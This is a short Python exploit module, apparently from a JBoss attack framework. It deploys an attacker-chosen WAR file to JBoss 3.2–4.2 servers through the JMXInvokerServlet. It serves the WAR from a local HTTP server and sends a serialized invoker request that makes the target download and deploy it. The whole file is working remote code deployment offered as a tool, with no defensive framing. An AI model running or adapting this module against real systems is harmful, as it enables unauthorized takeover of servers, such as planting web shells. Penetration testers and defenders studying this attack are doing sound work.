from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import _serve, invkdeploy, waitServe
from threading import Thread
from requests import get
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2"]
title = JINTERFACES.IN
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = fingerengine.options.deploy
    war_name = war_file.rsplit("/", 1)[1]

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/JMXInvokerServlet".format(
                    fingerengine.options.ip, fingerprint.port)
    local_url = "http://{0}:8000/{1}".format(utility.local_address(), war_name)

    # start the local HTTP server
    server_thread = Thread(target=_serve, args=(war_file,))
    server_thread.start()

    # run serialization code
    response = invkdeploy(versions[1], url, local_url)

    if response is not None:
        utility.Msg(response, LOG.DEBUG)

    if waitServe(server_thread):
        utility.Msg("{0} deployed to {1}".format(war_file, 
                                    fingerengine.options.ip), LOG.SUCCESS)
    else:
        utility.Msg("JMXInvokerServlet not vulnerable", LOG.ERROR)

    try:
        get("http://localhost:8000/", timeout=1.0)
    except:
        pass
